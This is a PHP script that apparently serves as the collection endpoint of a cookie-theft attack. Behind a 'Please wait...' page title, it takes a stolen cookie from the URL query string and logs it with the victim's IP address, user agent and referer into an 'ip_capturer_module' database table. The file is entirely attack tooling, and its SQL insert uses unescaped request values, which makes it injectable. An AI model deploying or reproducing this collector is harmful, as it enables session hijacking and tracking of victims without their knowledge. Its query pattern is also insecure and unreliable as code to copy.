<?php

echo "<head><title>Please wait...</title></head>";

require_once dirname(__FILE__)."/includes/mysql_connect.inc.php";
require_once dirname(__FILE__)."/includes/functions.inc.php";

$ip_address = detect_ip_address_2();
   
$cookie = @$_GET['cookie'];

if ($cookie == "") $cookie = "N/A";

$country_name = "SA"; //detect_country_name(detect_ip_address());

$user_agent = @$_SERVER['HTTP_USER_AGENT'];

$http_referer = @$_SERVER['HTTP_REFERER']; 

if ($http_referer == "") $http_referer = "N/A";

mysql_query("INSERT INTO ip_capturer_module(country,ip_address,user_agent,get_content,http_referer,date) VALUES(
                '$country_name',
                '$ip_address',
                '$user_agent',
                '$cookie',
                '$http_referer',
                CURRENT_TIMESTAMP())") or die (mysql_error());
?>